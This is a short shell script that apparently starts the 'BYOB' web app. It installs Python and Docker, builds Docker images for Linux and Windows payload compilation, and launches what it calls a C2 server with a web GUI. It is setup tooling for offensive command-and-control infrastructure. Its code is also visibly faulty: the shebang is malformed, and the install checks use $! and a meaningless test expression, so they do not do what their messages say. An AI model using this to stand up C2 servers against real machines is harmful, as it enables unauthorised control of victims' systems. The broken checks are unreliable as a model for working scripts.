#/bin/sh

echo "Running BYOB app startup..."

# Install Python if necessary

which python3 > /dev/null ; status=$! ; [ ! $(test) $status 0 ] && echo "Installing Python 3.6..." ; sudo apt install -y python3.6 || echo "Confirmed Python3 is installed."

# Install Docker if necessary

which docker > /dev/null ; status=$! ; [ ! $(test) $status 0 ] && echo "Installing Docker..." ; sudo apt install docker.io -y || echo "Confirmed Docker is installed."


# Install Python packages
echo "Installing Python packages..."
cd ~/byob/web-gui/
python3 -m pip install -r requirements.txt

# Build Docker images
echo "Building Docker images - this will take a while, please be patient..."
cd docker-pyinstaller1 \
; docker build -f Dockerfile-py3-amd64 -t nix-amd64 . \
; docker build -f Dockerfile-py3-i386 -t nix-i386 . \
; docker build -f Dockerfile-py3-win32 -t win-x32 .

# Run app
cd ..
echo "Running C2 server with locally hosted web app GUI..."
python3 run.py

